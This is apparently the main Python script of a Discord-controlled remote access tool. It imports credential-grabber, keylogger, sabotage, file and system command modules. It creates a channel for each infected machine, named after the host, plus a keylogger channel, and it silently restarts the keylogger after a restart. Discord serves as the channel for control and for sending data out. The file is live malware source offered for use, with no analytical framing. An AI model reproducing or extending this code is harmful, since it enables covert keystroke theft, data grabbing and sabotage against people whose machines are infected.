import threading
import time
from datetime import datetime

import discord

import commands.keylogger as _kl  # imported as module, not values
from commands.audio import AudioCommands
from commands.files import FileCommands
from commands.grabber import GrabberCommands
from commands.keylogger import KeyloggerCommands
from commands.sabotage import SabotageCommands
from commands.system import SystemCommands
from config import GUILD_ID, VOICE_CHANNEL_ID, bot, channel_ids
from system_utils import check_single_instance, load_admin_status
from utils import create_channel_if_not_exists, sanitize_channel_name, send_messages

bot.remove_command("help")


@bot.event
async def setup_hook():
    """Register all Cogs before the bot connects."""
    await bot.add_cog(AudioCommands(bot))
    await bot.add_cog(FileCommands(bot))
    await bot.add_cog(GrabberCommands(bot))
    await bot.add_cog(KeyloggerCommands(bot))
    await bot.add_cog(SabotageCommands(bot))
    await bot.add_cog(SystemCommands(bot))


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    bot.loop.create_task(send_messages())

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Guild not found")
        load_admin_status()
        return

    # Ensure main channel exists
    import platform

    sanitized = sanitize_channel_name(platform.node())
    channel = discord.utils.get(guild.channels, name=sanitized)
    if not channel:
        channel = await guild.create_text_channel(sanitized)
        print(f'Channel "{sanitized}" was created')
    else:
        print(f'Channel "{sanitized}" already exists')

    # Ensure keylogger channel exists
    _kl.load_keylogger_status()
    keylogger_channel = await create_channel_if_not_exists(
        guild, f"{sanitized}-keylogger"
    )
    channel_ids["keylogger_channel"] = keylogger_channel.id
    print(f"Keylogger channel ID set to: {keylogger_channel.id}")

    # Auto-restart keylogger if it was active before restart
    if _kl.keylogger_active:
        t = threading.Thread(target=_kl.start_keylogger, daemon=True)
        t.start()
        print("Keylogger auto-restarted from saved status.")
        await keylogger_channel.send("🟢 **Keylogger resumed after bot restart.**")

    channel_ids["voice"] = VOICE_CHANNEL_ID
    await channel.send(
        f"Bot is now online! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    load_admin_status()


# ── Entry point ────────────────────────────────────────────────────────────


def main():
    time.sleep(8)
    load_admin_status()
    check_single_instance()


if __name__ == "__main__":
    main()

bot.run(__import__("config").TOKEN)
